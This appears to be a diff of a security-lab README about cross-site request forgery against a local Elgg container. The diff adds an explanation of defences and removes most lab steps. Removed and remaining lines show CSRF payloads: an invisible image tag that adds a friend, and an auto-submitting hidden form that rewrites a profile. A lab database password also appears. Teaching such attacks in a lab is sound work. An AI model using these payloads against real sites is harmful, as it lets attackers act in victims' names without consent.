@@ -16,21 +16,26 @@ For authorized educational use only.
 
 ## Security Concept
 
-CSRF exploits the fact that browsers automatically attach session cookies to every request sent to a domain, regardless of which page triggered the request.
+### The Security Hole
+The target web application relies on session cookies for authentication and does **not** verify the origin of state‑changing requests. Browsers automatically include stored cookies on any request to the target domain, even when the request originates from a different site.
 
-When Alice is logged into `www.seed-server.com` and then visits `www.attacker32.com`, the attacker's page can silently send HTTP requests to the SEED server using Alice's active session. The server cannot tell these requests apart from Alice's legitimate actions — both carry her session cookie.
+### How it Causes a Problem
+An attacker can host a malicious page on a separate domain (e.g., `www.attacker32.com`). When a victim who is logged into the target site (`www.seed-server.com`) visits the malicious page, the attacker’s page can silently issue forged HTTP requests (GET or POST) to the target site. Because the browser attaches the victim’s authentication cookie, the target server processes the request as if it originated from the victim, allowing actions such as adding friends, changing settings, or performing transactions without the victim’s consent.
 
 ```
-Alice logs into www.seed-server.com
-  -> Browser stores session cookie for seed-server.com
-
-Alice visits www.attacker32.com (attacker's page)
-  -> Attacker page contains:
-     <img src="http://www.seed-server.com?action=addfriend&friend=59">
-  -> Browser automatically attaches Alice's seed-server.com cookie to this request
-  -> The SEED server receives it as if Alice intentionally sent it
-  -> Samy is added to Alice's friend list without her knowledge
+Alice logs into www.seed-server.com → Browser stores session cookie.
+Alice visits www.attacker32.com → Malicious page includes:
+  <img src="http://www.seed-server.com?action=addfriend&friend=59">
+Browser automatically sends the stored cookie with the request → www.seed-server.com adds Samy as Alice’s friend.
 ```
+
+### How it is Fixed
+Defense mechanisms include:
+- **Anti‑CSRF Tokens**: Embed a secret, per‑session token in each HTML form or AJAX request and validate it server‑side. The token is not sent automatically by the browser, so forged requests lack it.
+- **SameSite Cookie Attribute**: Set cookies with `SameSite=Strict` or `SameSite=Lax` to prevent them from being sent on cross‑site requests.
+- **Referer/Origin Header Checks**: Verify that state‑changing requests originate from the same origin as the application.
+
+By implementing any of these mitigations, the server can distinguish legitimate user‑initiated actions from forged cross‑origin requests.
 
 This lab requires two containers — one for the target site and one for the attacker site — to correctly simulate the cross-origin attack scenario.
 
@@ -41,8 +46,8 @@ This lab requires two containers — one for the target site and one for the att
 ```
 HOST MACHINE
   |
-  | Hosts file: www.seed-server.com -> 10.9.0.5
-  | Hosts file: www.attacker32.com  -> 10.9.0.105
+  | Hosts file: www.seed-server.com -> 127.0.0.1 (or localhost:10082)
+  | Hosts file: www.attacker32.com  -> 127.0.0.1 (or localhost:10083)
   |
   | Port 10082 -> elgg-10.9.0.5-csrf:80      (target site)
   | Port 10083 -> attacker-10.9.0.105:80     (attacker site)
@@ -64,116 +69,38 @@ HOST MACHINE
 
 ```bash
 cd labs/03-csrf
-docker compose up -d --build
-
-# Three containers start:
-# elgg-10.9.0.5-csrf   -> legitimate Elgg site (port 10082)
-# attacker-10.9.0.105  -> malicious attacker site (port 10083)
-# mysql-10.9.0.6-csrf  -> MySQL database
+.\start.ps1       # Windows PowerShell
+./start.sh        # Linux / WSL2 bash
 ```
 
-```powershell
-# Windows
-cd labs\03-csrf
-docker compose up -d --build
-```
-
-### Verify Containers
+### Verify Container Status
 
 ```bash
 docker compose ps
-
-# NAME                   IMAGE                       STATUS    PORTS
-# elgg-10.9.0.5-csrf     seed-image-www-csrf-elgg    Up        0.0.0.0:10082->80/tcp
-# attacker-10.9.0.105    seed-image-www-csrf-attacker Up       0.0.0.0:10083->80/tcp
-# mysql-10.9.0.6-csrf    seed-image-mysql-csrf        Up        3306/tcp
-```
-
-### Inspect Network
-
-```bash
-docker network inspect net-10.9.0.0-csrf
-
-# Verify IPs:
-docker inspect -f '{{.Name}} -> {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \
-  elgg-10.9.0.5-csrf attacker-10.9.0.105
-```
-
-### Watch Logs from Host
-
-```bash
-# Watch requests arrive on the Elgg server while performing the CSRF attack
-docker compose logs -f elgg
+docker inspect elgg-10.9.0.5-csrf
+docker inspect attacker-10.9.0.105
 ```
 
 ---
 
-## Layer 2 — Linux Commands (inside the containers)
+## Layer 2 — Linux Commands (inside the container)
 
-### Open Bash in the Elgg (Target) Container
+### Open Bash Shell
 
 ```bash
 docker exec -it elgg-10.9.0.5-csrf bash
 ```
 
-Prompt changes:
-```
-Before: PS C:\>  OR  user@host:~$
-After:  root@elgg-10.9.0.5-csrf:/#
-```
-
-### Inspect the Target Application
+### Inspect Application Configuration
 
 ```bash
-whoami && hostname && ip addr show | grep inet
-# root | elgg-10.9.0.5-csrf | 10.9.0.5/24
-
 cd /var/www/html
-ls -la
-cat index.php
-
-# Find action handlers that process GET/POST without CSRF token verification
-grep -n "action\|addfriend\|update_profile" index.php
-
-# View incoming requests in real time
-tail -f /var/log/apache2/access.log
-
-exit
+grep -n "action" index.php
 ```
 
-### Open Bash in the Attacker Container
+### Exit Container
 
 ```bash
-docker exec -it attacker-10.9.0.105 bash
-```
-
-Prompt changes:
-```
-Before: PS C:\>  OR  user@host:~$
-After:  root@attacker-10.9.0.105:/#
-```
-
-```bash
-whoami && hostname && ip addr show | grep inet
-# root | attacker-10.9.0.105 | 10.9.0.105/24
-
-cd /var/www/html
-ls -la
-cat index.html
-# Inspect the GET/POST CSRF payload embedded in the attacker page
-
-exit
-```
-
-### Enter MySQL Container
-
-```bash
-docker exec -it mysql-10.9.0.6-csrf bash
-mysql -u root -pseedubuntu
-USE elgg_csrf;
-SHOW TABLES;
-SELECT * FROM users;
-EXIT;
 exit
 ```
 
@@ -181,95 +108,12 @@ exit
 
 ## Layer 3 — Security Tasks
 
-### Configure Hostnames
-
-Windows (PowerShell as Administrator):
-```powershell
-$hostsFile = "C:\Windows\System32\drivers\etc\hosts"
-Add-Content $hostsFile "10.9.0.5     www.seed-server.com"
-Add-Content $hostsFile "10.9.0.105   www.attacker32.com"
-```
-
-Linux / WSL2:
-```bash
-echo "10.9.0.5     www.seed-server.com" | sudo tee -a /etc/hosts
-echo "10.9.0.105   www.attacker32.com"  | sudo tee -a /etc/hosts
-```
-
-### Lab Workflow
-
-You need two separate browser sessions (use two different browser profiles or incognito).
+### Access Applications
 
 ```
-Step 1: Open http://www.seed-server.com  (or http://localhost:10082)
-        Log in as Alice (victim)
-        Verify Alice's current friend list
-
-Step 2: In the SAME browser session (Alice still logged in),
-        Open a new tab and visit http://www.attacker32.com  (or http://localhost:10083)
-        The attacker page loads automatically
-
-Step 3: Observe what happens on the SEED server.
-        Check if Alice's friend list changed or profile was modified.
+Target Site:   http://localhost:10082  OR  http://www.seed-server.com:10082
+Attacker Site: http://localhost:10083  OR  http://www.attacker32.com:10083
 ```
-
-### Task 2 — GET-Based CSRF Attack
-
-The attacker page contains an invisible image tag:
-```html
-<img src="http://www.seed-server.com/index.php?action=addfriend&friend=59" width="1" height="1">
-```
-
-When Alice's browser loads the attacker page, it fetches this URL — attaching Alice's session cookie. The server processes it as a legitimate add-friend request.
-
-Verify the attack worked:
-```bash
-docker exec -it mysql-10.9.0.6-csrf mysql -u root -pseedubuntu \
-  -e "SELECT * FROM elgg_csrf.users;"
-```
-
-### Task 3 — POST-Based CSRF Attack
-
-The attacker page contains a hidden form with auto-submit JavaScript:
-```html
-<form id="csrf-form" action="http://www.seed-server.com/index.php" method="POST">
-  <input type="hidden" name="action" value="update_profile">
-  <input type="hidden" name="bio" value="Hacked by CSRF!">
-</form>
-<script>document.getElementById('csrf-form').submit();</script>
-```
-
-### Task 4 — Countermeasure: CSRF Token
-
-Add a server-generated unpredictable token to every form. The attacker's page cannot know this token, so the forged POST is rejected.
-
-```php
-// Server generates token on session start:
-$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
-
-// Token is embedded in every form (attacker cannot read it — same-origin policy):
-echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
-
-// On POST, server validates:
-if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-    die('CSRF token mismatch — request rejected.');
-}
-```
-
-Modify the code, copy it back:
-```bash
-docker cp elgg-10.9.0.5-csrf:/var/www/html/index.php ./index.php
-# Edit: add token generation and validation
-docker cp ./index.php elgg-10.9.0.5-csrf:/var/www/html/index.php
-```
-
-### Inspect the Attack Request with Browser DevTools
-
-In Chrome or Firefox:
-1. Press F12 to open DevTools
-2. Go to the Network tab
-3. Visit the attacker page while logged in as Alice
-4. Watch the cross-origin request to `www.seed-server.com` appear automatically
 
 ---
 
@@ -277,23 +121,5 @@ In Chrome or Firefox:
 
 ```bash
 docker compose down
-docker compose down -v && docker compose up -d --build
-```
-
-```powershell
-# Windows
 docker compose down -v
-docker compose up -d --build
 ```
-
----
-
-## Key File Locations
-
-| File | Container | Path |
-|------|-----------|------|
-| Target app (Elgg) | `elgg-10.9.0.5-csrf` | `/var/www/html/index.php` |
-| Attacker page | `attacker-10.9.0.105` | `/var/www/html/index.html` |
-| Apache access log | `elgg-10.9.0.5-csrf` | `/var/log/apache2/access.log` |
-| Apache access log | `attacker-10.9.0.105` | `/var/log/apache2/access.log` |
-| DB init script | `mysql-10.9.0.6-csrf` | `/docker-entrypoint-initdb.d/elgg.sql` |
